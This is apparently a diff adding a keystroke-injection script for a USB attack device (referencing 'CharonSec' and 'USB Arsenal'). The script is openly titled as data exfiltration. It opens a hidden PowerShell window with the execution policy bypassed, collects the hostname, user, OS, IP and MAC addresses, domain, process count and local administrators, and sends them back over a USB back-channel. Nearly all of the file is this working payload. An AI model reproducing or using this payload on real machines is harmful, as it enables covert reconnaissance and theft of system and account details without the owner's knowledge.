@@ -1,0 +1,19 @@
+REM ============================================================
+REM  Windows · Exfiltrate Data via Back-Channel
+REM ============================================================
+REM  Collects system info, network config, running processes,
+REM  and installed software — then sends it back to CharonSec
+REM  over the USB CDC ACM back-channel (no network needed).
+REM
+REM  Requires USB Arsenal "Back-Channel Bridge" profile.
+REM  Result appears in the HID IDE as a captured value.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+WINHI 15000 @{Hostname=hostname;User=$env:USERNAME;OS=(Get-CimInstance Win32_OperatingSystem).Caption;IP=(Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|Select -First 1).IPAddress;MAC=(Get-NetAdapter|?{$_.Status -eq 'Up'}|Select -First 1).MacAddress;Domain=$env:USERDOMAIN;Procs=(Get-Process|Measure).Count;Admins=(net localgroup Administrators 2>&1)} | ConvertTo-Json -Compress
